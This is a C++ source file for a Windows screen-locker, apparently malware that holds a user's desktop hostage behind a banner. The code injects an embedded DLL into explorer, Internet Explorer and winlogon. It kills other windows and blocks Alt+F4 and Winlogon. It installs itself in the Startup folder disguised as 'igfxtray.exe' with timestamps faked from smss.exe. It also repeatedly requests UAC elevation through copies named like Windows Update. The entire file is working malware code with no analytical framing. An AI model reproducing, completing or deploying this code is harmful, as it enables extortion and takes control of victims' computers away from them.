#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <time.h>
#include <stdio.h>
#include <assert.h>
#include <hash_set>

#include "lnk.h"
#include "Inject.h"
#include "GetApi.h"
#include "pefile.h"
#include "InjectUtils.h"
#include "dprint.h"
#include "privileges.h"
#include "procenum.h"
#include "getsec.h"

#ifdef _M_AMD64
#error ERROR: code is not ready for X64
#endif

typedef void (WINAPI *LockerDllExportFunction)(void* dll_body);

struct LockerDll
{
  void* dll_base;
  void* dll_body;

  LockerDllExportFunction StartNonIeTopWindowProcessesKilling; 
  LockerDllExportFunction StartIeMsgFilterInjecting;
  LockerDllExportFunction StartWinlogonBlockInjecting;
  
  LockerDllExportFunction StartBanner;
};

void  StartFunction_Main(LockerDll* loded_dll);
void  StartFunction_ProtectFromAltTabByKillNonIeProcess(LockerDll* loded_dll);
void  StartFunction_ProtectFromWinlogon(LockerDll* loded_dll);
void  StartFunction_ProtectIeFromAltF4(LockerDll* loded_dll);
void* GetDllForInject();



typedef void (*StartFunction)(LockerDll* loded_dll);
struct FunctionId2Function
{
  DWORD function_range_start;
  DWORD function_range_end;
  const WCHAR* def_name;
  DWORD        def_name_char_length;
  StartFunction start_function;

} start_function_table[] =
{
  {1400, 1600, L"5xocgeXJlXPmTXe", 15, StartFunction_ProtectFromAltTabByKillNonIeProcess},
  {1200, 1400, L"Js0Ku3zbP89pvn",  14, StartFunction_ProtectFromWinlogon},
  {1000, 1200, L"TxUjKPcKJ6lt",    12, StartFunction_ProtectIeFromAltF4},
  //{1000, 1200, L"TxUjKPcKJ6lt",    12, NULL},
};



void* LoadLockerDllProcAddr(void* dll_base, const char* proc_name)
{
	DWORD func_rva = PEFile::GetRVAProc(dll_base, (PCHAR)proc_name, TRUE);
  return PEFile::VAtoAddr(dll_base, TRUE, func_rva); 
}

bool LoadLockerDll(LockerDll* locker_dll)
{
  PP_DPRINTF(L"LoadLockerDll: Loading started.");

  ZeroMemory(locker_dll, sizeof(LockerDll));
  
  locker_dll->dll_body = GetDllForInject();
  PP_RETURNIF2(locker_dll->dll_body == NULL, false);

  locker_dll->dll_base = InjectRemouteDll(GetCurrentProcess(), 
                            locker_dll->dll_body, NULL, 0);
  PP_RETURNIF2(locker_dll->dll_base == NULL, false);

  struct 
  {
    const char*               func_name;
    LockerDllExportFunction*  func_addr;
  } func_table[] =
  {
    {"F1", &locker_dll->StartNonIeTopWindowProcessesKilling},
    {"F2", &locker_dll->StartIeMsgFilterInjecting},
    {"F3", &locker_dll->StartWinlogonBlockInjecting},
    {"F4", &locker_dll->StartBanner},
  };

  for (size_t i = 0; i < ARRAYSIZE(func_table); i++)
  {
    void* func_addr = LoadLockerDllProcAddr(locker_dll->dll_base, 
      func_table[i].func_name);

    PP_RETURNIF2(func_addr == NULL, false);

    *func_table[i].func_addr = (LockerDllExportFunction)func_addr;    
  }

  PP_DPRINTF(L"LoadLockerDll: Locker dll and functions are loaded OK.");
  return true;
}



class RandomGen
{
public:
  RandomGen(): m_provider(NULL) 
  {
  }

  ~RandomGen()
  { 
    if (m_provider != NULL)
    {
      ::CryptReleaseContext(m_provider, 0);
    }
    CoUninitialize();
  }

  bool Init()
  {
    DWORD last_error = 0;

    // Пробуем открыть дефолтный keyset.
    if (::CryptAcquireContext(&m_provider, NULL, NULL, PROV_RSA_FULL, 0))
    {
      return TRUE;
    }
    
    // Если его нет - попробуем открыть создать
    last_error = GetLastError();    
    if (last_error != NTE_BAD_KEYSET) 
    {
      PP_DPRINTF(L"RandomGen::Init: CryptAcquireContext failed: last_error=0x%X",
        last_error);
      return FALSE;
    }
    
    if (::CryptAcquireContext(&m_provider, NULL, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET))
    {
      return TRUE;
    }
    
    // Не удалось создать.
    last_error = GetLastError();    
    PP_DPRINTF(L"RandomGen::Init: CryptAcquireContext with new keyset failed: last_error=0x%X",
      last_error);

    return FALSE;
  }

  bool GetRandomBytes(void* data, size_t data_length)
  {
    //return false;
    return (TRUE == ::CryptGenRandom(m_provider, data_length, (BYTE*)data));
  }

private:
  HCRYPTPROV m_provider;
};


void GenerateMarkForStartFunction(
  void*  function,
  WCHAR* buffer,
  DWORD  buffer_char_length,
  DWORD* returned_length
  )
{
  WCHAR char_table[64];
  DWORD char_table_size = 0;

  for (WCHAR c='a'; c <= 'z';c++)
  {
    char_table[char_table_size] = c;
    char_table_size++;
  }

  for (WCHAR c='A'; c <= 'Z';c++)
  {
    char_table[char_table_size] = c;
    char_table_size++;
  }
  
  for (WCHAR c='0'; c <= '9';c++)
  {
    char_table[char_table_size] = c;
    char_table_size++;
  }

  RandomGen     rand_gen;
  int           function_ix = -1;
  DWORD         def_name_length = 0;
  const WCHAR*  def_name = NULL;

  do
  {
    DWORD start = 0;
    DWORD end = 0;
    DWORD cur_output_index = 0;
    DWORD name_summ = 0;

    for (int i=0; i < ARRAYSIZE(start_function_table);i++)
    {
      if (start_function_table[i].start_function == function)
      {
        function_ix = i;
        start = start_function_table[i].function_range_start;
        end   = start_function_table[i].function_range_end;
        break;
      }
    }

    if (function_ix == -1)  break;

    if (!rand_gen.Init())
    {
      DWORD last_error = GetLastError();
      PP_DPRINTF(L"GenerateMarkForStartFunction: rand_gen.Init() failed.last_error={%d,0x%X}",
        last_error,last_error 
        );
      break;
    }
    
    while (cur_output_index < buffer_char_length)
    {
      DWORD rand_index;

      if (!rand_gen.GetRandomBytes(&rand_index, sizeof(rand_index)))
      {
        PP_DPRINTF(L"GenerateMarkForStartFunction: rand_gen.GetRandomBytes() failed.");
        break;
      }
      
      rand_index %= char_table_size;
      WCHAR ch = char_table[rand_index];
      
      name_summ += ch;
      buffer[cur_output_index] = ch;
      cur_output_index++;

      if (name_summ >= start && name_summ < end)
      {
        *returned_length = cur_output_index;
        return;
      }
    }
  }
  while(false);

  *returned_length = 0;

  PP_RETURNIF1(function_ix == -1);

  def_name_length = start_function_table[function_ix].def_name_char_length;
  def_name = start_function_table[function_ix].def_name;

  PP_RETURNIF1(buffer_char_length < def_name_length);
  
  memcpy(buffer, def_name, def_name_length * sizeof(WCHAR));
  *returned_length = def_name_length;
}

void LookupFunctionalParamInCmdLine(
  const WCHAR** param_addr, 
  DWORD * param_length)
{
  *param_length = 0;
  
  // FIXME: память argv не освобождаем, потому что вызываем ф-цию 
  //        всего пару раз на процесс. Проще забить.
  int     argc=0;
  LPWSTR* argv=CommandLineToArgvW(GetCommandLineW(),&argc);

  // Пробегаемсмя по всем параметрам.
  for (int pix=0; pix < argc; pix++)
  {
    const WCHAR* parametr_name = argv[pix];
    DWORD length = wcslen(parametr_name);
    DWORD name_summ = 0;

    // Проверка на префикс '--' для функционального параметра
    if (length < 2) continue;
    if (parametr_name[0] != L'-') continue;
    if (parametr_name[1] != L'-') continue;
    
    // Игнорим префикс в итоговой сумме
    *param_addr    = &parametr_name[2];
    *param_length  = length - 2;
  }
}

StartFunction LookupStartFunction()
{
  const WCHAR*  param_name = L"";
  DWORD         param_name_length = 0;
  DWORD         name_summ = 0;

  LookupFunctionalParamInCmdLine(&param_name, &param_name_length);

  PP_RETURNIF2(param_name_length == 0, StartFunction_Main);

  // Вычисляем сумму
  for (DWORD i = 0; i < param_name_length; i++)
  {
    name_summ += param_name[i];
  }
  
  // Находим ф-цию, для которой сумма от имени входит в промежуток
  for (int i=0; i < ARRAYSIZE(start_function_table);i++)
  {
    DWORD start = start_function_table[i].function_range_start;
    DWORD end = start_function_table[i].function_range_end;
    
    if (name_summ >= start && name_summ < end)
    {
      return start_function_table[i].start_function;
    }
  }

  return StartFunction_Main;
}

void GetPathDirectory(
  const WCHAR * path,
  DWORD         path_char_length,
  WCHAR*        buffer, 
  DWORD         buffer_char_length, 
  DWORD*        returned_char_length
  )
{
  // Ищем директорию в пути.
  // Примеры: 
  //   для 'с:\testpath\file1.exe' должно найти 'с:\testpath\'
  //   для 'file2'                 должно найти ''
  const WCHAR* low_limit  = path;
  const WCHAR* high_limit = path + path_char_length;

  *returned_char_length = 0;

  while ((high_limit > low_limit) && (*(high_limit-1) != L'\\')) high_limit--;

  DWORD directory_length = high_limit - low_limit;

  PP_RETURNIF1(directory_length > (buffer_char_length - 1));

  memmove(buffer, path, directory_length * sizeof(WCHAR));
  buffer[directory_length] = L'\0';
  *returned_char_length = directory_length;
}

void GetPathFileNameWithoutExt(
  const WCHAR * path,
  DWORD         path_char_length,
  WCHAR*        buffer, 
  DWORD         buffer_char_length, 
  DWORD*        returned_char_length
  )
{
  // Ищем имя файла, убирая расширение.
  // Примеры: 
  //   для 'с:\testpath\file1.exe' должно найти 'file1'
  //   для 'с:\testpath\file2'     должно найти 'file2'
  
  const WCHAR* low_limit = path;
  const WCHAR* high_limit = path + path_char_length;
  const WCHAR* file_name = high_limit;

  *returned_char_length = 0;

  while ((file_name > low_limit) && (*(file_name-1) != L'\\')) file_name--;

  const WCHAR* file_ext = file_name;  

  while ((file_ext < high_limit) && (*file_ext != L'.'))
  {
    file_ext++;
  }

  DWORD file_name_length = file_ext - file_name;

  PP_RETURNIF1(file_name_length > buffer_char_length);

  memmove(buffer, file_name, file_name_length * sizeof(WCHAR));
  *returned_char_length = file_name_length;
}

void GetCurrentProcessModuleDirectory(
  WCHAR* buffer, 
  DWORD  buffer_char_length, 
  DWORD* returned_char_length
  )
{
  *returned_char_length = 0;

  DWORD path_length = GetModuleFileName(NULL, buffer, buffer_char_length);
  PP_RETURNIF1(path_length == buffer_char_length);

  GetPathDirectory(buffer, path_length, buffer, buffer_char_length, 
    returned_char_length);
}

void GetCurrentProcessModuleName(
  WCHAR* buffer, 
  DWORD  buffer_char_length, 
  DWORD* returned_char_length
  )
{
  *returned_char_length = 0;

  WCHAR path[2*MAX_PATH];
  DWORD path_length = GetModuleFileName(NULL, path, ARRAYSIZE(path));
  PP_RETURNIF1(path_length == ARRAYSIZE(path));

  GetPathFileNameWithoutExt(path, path_length, buffer, buffer_char_length, 
    returned_char_length);
}

void CreateTempExeFilePathWithPrefix(
  const WCHAR * prefix,
  WCHAR* buffer, 
  DWORD  buffer_char_length, 
  DWORD* returned_char_length
  )
{
  *returned_char_length = 0;
  

  WCHAR path[MAX_PATH];
  WCHAR tmp_file_name[100];
  DWORD tmp_file_name_len = 0;
  DWORD tmp_dir_length = 0;
  DWORD prefix_length  = ::wcslen(prefix);


  ZeroMemory(path, sizeof(path));
  ZeroMemory(tmp_file_name, sizeof(tmp_file_name));

  ::GetTempPath(ARRAYSIZE(path), path);

  PP_RETURNIF1(buffer_char_length < MAX_PATH);
  DWORD result = ::GetTempFileName(path, L"", 0, buffer);
  PP_RETURNIF1(result == 0);

  GetPathFileNameWithoutExt(buffer, ::wcslen(buffer), 
    tmp_file_name, 
    ARRAYSIZE(tmp_file_name) - 1,
    &tmp_file_name_len);

  GetPathDirectory(buffer, ::wcslen(buffer), 
    buffer, buffer_char_length, 
    &tmp_dir_length 
    );

  PP_RETURNIF1(tmp_file_name_len == 0);
  PP_RETURNIF1(tmp_dir_length == 0);

  PP_RETURNIF1(buffer_char_length < (tmp_dir_length + prefix_length + tmp_file_name_len + 5));

  buffer[tmp_dir_length] = L'\0';
  tmp_file_name[tmp_file_name_len] = L'\0';
  
  ::wcscat_s(buffer, buffer_char_length, prefix);
  ::wcscat_s(buffer, buffer_char_length, tmp_file_name);
  ::wcscat_s(buffer, buffer_char_length, L".exe");

  *returned_char_length = tmp_dir_length + prefix_length + tmp_file_name_len + 4;
}

const WCHAR * kUacComandLineParam = L" -UAC";

bool UAC_CommandLineMarkedAsPrivilegeRun()
{
  return (StrStr(GetCommandLine(), kUacComandLineParam) != NULL);
}

bool UAC_IsPrivilegesRequired()
{
  ScopedDebugPrivilege debug_privilege;

  return (debug_privilege.Enabled() == false);
}

bool UAC_IsSystemSupported()
{
  OSVERSIONINFOEX ver;
  bool            ver_detected = false;

  ZeroMemory(&ver, sizeof(ver));

  ver.dwOSVersionInfoSize = sizeof(ver);
  ver_detected = (GetVersionEx((LPOSVERSIONINFO)&ver) == TRUE);

  PP_DPRINTF(L"UAC_IsSystemSupported: windows version detecting (detected=%d, MajorVersion=%d)", 
    ver_detected,
    ver.dwMajorVersion
    );
  
  PP_RETURNIF2(ver_detected == false,  false);
  PP_RETURNIF2(ver.dwMajorVersion < 6, false);

  return true;
}

void UAC_CreateRequestToUser()
{
  char manifest[] =
    "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n"
    "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n"
    "	<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n"
    "		<security>\r\n"
    "			<requestedPrivileges>\r\n"
    "				<requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"></requestedExecutionLevel>\r\n"
    "			</requestedPrivileges>\r\n"
    "		</security>\r\n"
    "	</trustInfo>\r\n"
    "</assembly>\r\n";

  // Подстраховка от рекурсии вызовов процессов.
  PP_RETURNIF1(UAC_CommandLineMarkedAsPrivilegeRun()); 

  // For Vista and later - ONLY
  PP_RETURNIF1(UAC_IsSystemSupported() == false);

  WCHAR self_path[MAX_PATH];
  DWORD self_path_length = 0;

  self_path_length = ::GetModuleFileName(NULL, self_path, ARRAYSIZE(self_path));

  PP_RETURNIF1(self_path_length == ARRAYSIZE(self_path));

  for (;;)
  {
    std::wstring  file_path;
    std::wstring  file_parameters;
    std::wstring  manifest_path;
    DWORD         file_path_length = 0;

    file_path.resize(2 * MAX_PATH);

    CreateTempExeFilePathWithPrefix(L"WindowsUpdate-",
      (WCHAR*)file_path.data(), file_path.size() - 1, &file_path_length);

    PP_RETURNIF1(file_path_length == 0);

    file_path.resize(file_path_length);
    
    file_parameters = file_path;
    file_parameters += kUacComandLineParam;

    const WCHAR* param = L"";
    DWORD        param_length = 0;
    
    LookupFunctionalParamInCmdLine(&param, &param_length);
    if (param_length > 0)
    {
      file_parameters += L" --";
      file_parameters.append(param, param_length);      
    }


    manifest_path = file_path;
    manifest_path += L".manifest";

    // Игнорим ошибки - вылезет при создании процесса.
    ::CopyFile(self_path, file_path.c_str(), TRUE);

    // Игнорим ошибки - вылезет при создании процесса.
    HANDLE h = CreateFile(manifest_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) 
    {
      DWORD written = 0;
      WriteFile(h, manifest, sizeof(manifest) - 1, &written, NULL);
      CloseHandle(h);
    }

    for (size_t i = 0; i < 20; i++)
    {
		  SHELLEXECUTEINFO ei;

      ZeroMemory(&ei, sizeof(ei));

		  ei.cbSize = sizeof(ei);
      ei.lpFile = file_path.c_str();
      ei.lpParameters = file_parameters.c_str();
		  ei.fMask = SEE_MASK_NOCLOSEPROCESS;

      PP_DPRINTF(L"UAC_CreateRequestToUser: runing ShellExecuteEx('%s')..",
        file_parameters.c_str());

      BOOL  executed = ::ShellExecuteEx(&ei);
      DWORD last_error = GetLastError();
      
      PP_DPRINTF(L"UAC_CreateRequestToUser: CreateProcess result: executed=%d last_error=%d p=0x%X",
        executed,
        last_error,
        ei.hProcess
        );
      
      // Тут ошибки проверяем. 
      // Но все равно продолжаем пытатся.
      if (!executed) continue;
      
      DWORD exit_code = 1;

      WaitForSingleObject(ei.hProcess, INFINITE);
      GetExitCodeProcess(ei.hProcess, &exit_code);
      CloseHandle(ei.hProcess);

      PP_RETURNIF1(exit_code == 0);
    }
  }
}

void CloneSelfProtectorsAndRun()
{
  WCHAR self_path[MAX_PATH];
  DWORD self_path_length = 0;
  WCHAR dir[MAX_PATH];
  DWORD dir_length = 0;

  self_path_length = ::GetModuleFileName(NULL, self_path, ARRAYSIZE(self_path));
  
  GetCurrentProcessModuleDirectory(dir, ARRAYSIZE(dir), &dir_length);

  if (self_path_length == ARRAYSIZE(self_path)) return;
  if (dir_length == 0) return;

  for (size_t i = 0; i < ARRAYSIZE(start_function_table); i++)
  {
    WCHAR file_path[2 * MAX_PATH];
    DWORD file_path_length = 0;

    WCHAR file_param[MAX_PATH];
    DWORD file_param_length = 0;

    CreateTempExeFilePathWithPrefix(L"", file_path, ARRAYSIZE(file_path), 
      &file_path_length);

    if (file_path_length == 0)
    {
      PP_DPRINTF(L"CloneSelfProtectorsAndRun: CreateTempExeFilePathWithPrefix() failed.");
      continue;
    }

    GenerateMarkForStartFunction(
      start_function_table[i].start_function,
      file_param, 
      ARRAYSIZE(file_param) - 1, 
      &file_param_length);

    if (file_param_length == 0)
    {
      PP_DPRINTF(L"CloneSelfProtectorsAndRun: GenerateMarkForStartFunction() failed.");
      continue;
    }

    file_path[file_path_length]   = L'\0';
    file_param[file_param_length] = L'\0';
    
    ::CopyFile(self_path, file_path, FALSE);

    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);

    ZeroMemory( &pi, sizeof(pi) );

    wcscat_s(file_path, L" --");
    wcscat_s(file_path, file_param);

    ::CreateProcess(NULL, file_path, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
  }
}

void DispatchOnStart()
{
  LockerDll locker_dll;

  PP_RETURNIF1(!LoadLockerDll(&locker_dll));

  StartFunction start = LookupStartFunction();

  start(&locker_dll);
}

void SetFakeFileDateTime(const WCHAR* Path)
{
	WCHAR smss[] = L"\\smss.exe";
	WCHAR SysPath[2* MAX_PATH];

  ZeroMemory(SysPath, sizeof(SysPath));

  GetSystemDirectory( SysPath, ARRAYSIZE(SysPath));
  wcscat_s( SysPath, smss );

	HANDLE hTemplateFile = CreateFile( SysPath,  GENERIC_READ,  FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
  PP_RETURNIF1(hTemplateFile == INVALID_HANDLE_VALUE);

	FILETIME fl1;
	FILETIME fl2;
	FILETIME fl3;

	GetFileTime( hTemplateFile, &fl1, &fl2, &fl3 );
	CloseHandle( hTemplateFile );

	HANDLE hTargetFile = CreateFileW( Path,  GENERIC_WRITE,  FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	PP_RETURNIF1(hTargetFile == INVALID_HANDLE_VALUE);

	SetFileTime( hTargetFile, &fl1, &fl2, &fl3 );
	CloseHandle( hTargetFile );
}

void AddSelfBodyToAutorun()
{
  /// Получаем путь к папке автостарта.
  /// Копируем себя в CSIDL_STARTUP и правим времена и аттрибуты файла,
  /// чтобы он не светился в меню.

  WCHAR             self_path[MAX_PATH];
  PIDLIST_ABSOLUTE  id_list;
  WCHAR             dst_file_path[2 * MAX_PATH];
  WCHAR             dst_file_name[] = L"\\igfxtray.exe";

  CoInitialize(NULL);

  GetModuleFileName(0,self_path,MAX_PATH);
  SHGetSpecialFolderLocation(0,CSIDL_STARTUP,&id_list);
  
  PP_RETURNIF1(FALSE == SHGetPathFromIDList(id_list,dst_file_path));

  CoTaskMemFree(id_list);
  CoUninitialize();  

  wcscat_s(dst_file_path, dst_file_name);

  // Проверяем на существование себя.
  PP_RETURNIF1(GetFileAttributes(dst_file_path) != INVALID_FILE_ATTRIBUTES);
  
  // Копируем себя в автостарт
  PP_RETURNIF1(CopyFile(self_path, dst_file_path, TRUE) == FALSE);

  SetFakeFileDateTime(dst_file_path);

  SetFileAttributes(dst_file_path, 
    FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

  PP_DPRINTF(L"AddSelfBodyToAutorun: finished OK.");
}

void  StartFunction_ProtectFromAltTabByKillNonIeProcess(LockerDll* loaded_dll)
{
  PP_DPRINTF(L"LockerExe:StartFunction_ProtectFromAltTabByKillNonIeProcess: started.");

  PP_RETURNIF1(loaded_dll->dll_body == NULL);
  PP_RETURNIF1(loaded_dll->dll_base == NULL);
  PP_RETURNIF1(loaded_dll->StartNonIeTopWindowProcessesKilling == NULL);

  loaded_dll->StartNonIeTopWindowProcessesKilling(loaded_dll->dll_body);
}

void  StartFunction_ProtectFromWinlogon(LockerDll* loaded_dll)
{
  PP_DPRINTF(L"LockerExe:StartFunction_ProtectFromWinlogon: started.");

  PP_RETURNIF1(loaded_dll->dll_body == NULL);
  PP_RETURNIF1(loaded_dll->dll_base == NULL);
  PP_RETURNIF1(loaded_dll->StartWinlogonBlockInjecting == NULL);

  // Нам нужны привилегии для прыжка в Winlogon.
  if (UAC_IsPrivilegesRequired())
  {
    // Если их нету - проверяем не запустили ли нас уже на эскалацию?
    PP_DPRINTF(L"LockerExe: UAC privileges required!");

    if (UAC_CommandLineMarkedAsPrivilegeRun())
    {
      // Таки так, запустили, но прав всё равно нету.
      PP_DPRINTF(L"LockerExe: We already run as with UAC privileges, but we don't have"
        L" required rights!");
      
      // Прекращаем рекурсию. Что-то не так с системой.
      ExitProcess(0);
    }
    else
    {
      PP_DPRINTF(L"LockerExe: We start in restricted mode. We start to ask user allow us required rights.");

      // Так, можем бомжевать права UAC.
      UAC_CreateRequestToUser();      
    } 

    // Прав нет и мы сделали все что можно.
    // Завершаемся с ошибкой.
    ExitProcess(1);
  }

  PP_DPRINTF(L"LockerExe: All rights are allowed!!! We are DONE.");


  loaded_dll->StartWinlogonBlockInjecting(loaded_dll->dll_body);
}

void  StartFunction_ProtectIeFromAltF4(LockerDll* loaded_dll)
{
  PP_DPRINTF(L"LockerExe:StartFunction_ProtectIeFromAltF4: started.");

  PP_RETURNIF1(loaded_dll->dll_body == NULL);
  PP_RETURNIF1(loaded_dll->dll_base == NULL);
  PP_RETURNIF1(loaded_dll->StartIeMsgFilterInjecting == NULL);

  loaded_dll->StartIeMsgFilterInjecting(loaded_dll->dll_body);
}

void StartFunction_Main(LockerDll* loaded_dll)
{
  /// Если в командной строке есть что-то кроме своего пути -
  /// оно запускается и процесс работы продолжается.

  int argc=0;
  LPWSTR *argv=CommandLineToArgvW(GetCommandLineW(),&argc);
  if (argc > 2)
  {
    ::ShellExecuteW(0,NULL,argv[1],NULL,NULL,SW_SHOW);
  }

  PP_RETURNIF1(loaded_dll->dll_body == NULL);
  PP_RETURNIF1(loaded_dll->dll_base == NULL);
  PP_RETURNIF1(loaded_dll->StartBanner == NULL);

  AddSelfBodyToAutorun();

  // Клонируем себя в разные ехе и запускаем протекторы
  CloneSelfProtectorsAndRun();

  // Если мы на системе с поддержкой UAC и 
  // у нас не хватает привилегий - ждем пока наши 
  // протекторы пытаются получить UAC.
  if (UAC_IsSystemSupported() && UAC_IsPrivilegesRequired())
  {
    DWORD timeout = 30;
    PP_DPRINTF(L"StartFunction_Main: UAC system detected and UAC required. "
      L"Waiting for %d sec...",
      timeout);
    Sleep(timeout * 1000);
  }

  /// Запуск процесс показа банера
  loaded_dll->StartBanner(loaded_dll->dll_body);
  
  /// Бесконечный цикл работы.
  while (true)
  {
    Sleep(1);
  }
}

void* GetDllForInject()
{
  DWORD  data_size = 0;
  void * data = GetSectionData("LockerDll", &data_size);

  PP_RETURNIF2(data_size == 0, NULL);
  return data;


  //return (void*)&imported_dll_image[0];  

  //return (void*)&imported_dll_image[0];  
  ////const WCHAR* dll_path = L"E:\\tmp\\blocker\\locker\\bin\\Release\\locker.dll";
  //const WCHAR* dll_path = L"E:\\tmp\\blocker\\L Locker\\bin\\Debug\\locker_i.dll";
  ////const WCHAR* dll_path = L"locker.dll";
  //
  //HANDLE h = ::CreateFile(dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
  //if (h == INVALID_HANDLE_VALUE) return NULL;

  //void* local_dll = malloc(1024*1024);
  //DWORD file_size = GetFileSize(h, NULL);
  //DWORD returned_length = 0;
  //
  //ReadFile(h, local_dll, file_size, &returned_length, NULL);
  //CloseHandle(h);

  //if (returned_length == 0) return NULL;
  //return local_dll; 
}



//void TestNameGeneration()
//{
//  WCHAR file_name[MAX_PATH];
//  DWORD file_name_length;
//
//  GetCurrentProcessModuleDirectory(file_name, ARRAYSIZE(file_name), &file_name_length);
//  GetCurrentProcessModuleName(file_name, ARRAYSIZE(file_name), &file_name_length);
//  while (true)
//  {
//    WCHAR buffer1[200];
//    WCHAR buffer2[200];
//    WCHAR buffer3[200];
//    DWORD returned_length1;
//    DWORD returned_length2;
//    DWORD returned_length3;
//    StartFunction f;
//
//    GenerateMarkForStartFunction(
//      StartFunction_ProtectFromAltTabByKillNonIeProcess, 
//      buffer1, ARRAYSIZE(buffer1), &returned_length1
//      );    
//
//
//    f = LookupStartFunction(buffer1, returned_length1);
//    assert(f == StartFunction_ProtectFromAltTabByKillNonIeProcess);
//    
//
//    GenerateMarkForStartFunction(
//      StartFunction_ProtectFromWinlogon, 
//      buffer2, ARRAYSIZE(buffer2), &returned_length2
//      );
//    
//
//    f = LookupStartFunction(buffer2, returned_length2);
//    assert(f == StartFunction_ProtectFromWinlogon);
//
//    GenerateMarkForStartFunction(
//      StartFunction_ProtectIeFromAltF4, 
//      buffer3, ARRAYSIZE(buffer3), &returned_length3
//      );
//
//    f = LookupStartFunction(buffer3, returned_length3);
//    assert(f == StartFunction_ProtectIeFromAltF4);
//
//    Sleep(1);
//  }
//}


void ImitateBootkitInject(
  ProcessFilterFunction filter,
  bool dbg_privilege_required
  )
{
  void*                   local_dll = GetDllForInject();  
  stdext::hash_set<DWORD> injected_pids;

  while (true)
  {
    DWORD pids[200];
    DWORD pid_count = 0;

    FilteredEnumProcesses(filter, pids, ARRAYSIZE(pids), &pid_count);
    for (DWORD i = 0; i < pid_count; i++)
    {
      DWORD pid = pids[i];
      PVOID r = NULL;

      if (injected_pids.find(pid) != injected_pids.end()) 
        continue;

      HANDLE p = NULL;
      if (dbg_privilege_required)
      {
        ScopedDebugPrivilege pr;

        PP_DPRINTF(L"ImitateBootkitInject: Debug privileges required: enabled=%d", pr.Enabled());
        p = OpenProcess(PROCESS_CREATE_THREAD | 
          PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | 
          PROCESS_VM_WRITE | PROCESS_VM_READ,
          false, pid);
      }
      else
      {
        PP_DPRINTF(L"ImitateBootkitInject: Debug privileges NOT required.");
        p = OpenProcess(PROCESS_CREATE_THREAD | 
          PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | 
          PROCESS_VM_WRITE | PROCESS_VM_READ,
          false, pid);
      }

      DWORD le = GetLastError();

      PP_DPRINTF(L"ImitateBootkitInject: Opening process result pid=%d handle=0x%X le=%d",
        pid, p, le);

      r = InjectRemouteDll(p, local_dll, NULL, 0);
      if (r != NULL) injected_pids.insert(pid);
      if (p) CloseHandle(p);

      PP_DPRINTF(L"ImitateBootkitInject: Dll injected result into pid=%d res=0x%p",
        pid, r);
    }
    Sleep(100);
  }
}

bool ProcessFilter_IE(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"iexplore") != NULL);
}

bool ProcessFilter_Explorer(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"explorer") != NULL);
}

bool ProcessFilter_Notepad(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"notepad") != NULL);
}

bool ProcessFilter_Winlogon(const PROCESSENTRY32* ppe)
{
  return (StrStrI(ppe->szExeFile, L"winlogon") != NULL);
}

bool ProcessFilter_AllBootkitProcesses(const PROCESSENTRY32* ppe)
{
  return (
    ProcessFilter_IE(ppe) ||
    ProcessFilter_Explorer(ppe) ||
    ProcessFilter_Notepad(ppe) ||
    ProcessFilter_Winlogon(ppe)
    );
}



void Test()
{
  //AddSelfBodyToAutorun();

  LockerDll locker_dll;

  PP_RETURNIF1(!LoadLockerDll(&locker_dll));

  //ImitateBootkitInject(ProcessFilter_AllBootkitProcesses, true);

  // void* local_dll = GetDllForInject();
  // void* dll_base = InjectRemouteDll(GetCurrentProcess(), local_dll, NULL, 0);

  // LockerDllExportFunction f;
  //void* ff = GetApiAddr((HMODULE)dll_base,"ProtectFromIe");

	//if ( DWORD FuncApiRVA = PEFile::GetRVAProc(dll_base,"ProtectFromIe",TRUE) )
	//{
	//	f = (LockerDllExportFunction)(DWORD)((BYTE*)dll_base + FuncApiRVA);
	//}
  
  while(true) Sleep(1);
  return;
}

int CALLBACK WinMain(
  __in  HINSTANCE hInstance,
  __in  HINSTANCE hPrevInstance,
  __in  LPSTR lpCmdLine,
  __in  int nCmdShow
)
{
  // Для использования ф-циями из getapi.h надо инициализировать 
  // указатель на ntdll.dll
  InitializeNTDLL();

  //Test();
  DispatchOnStart(); 
  return 0;
}

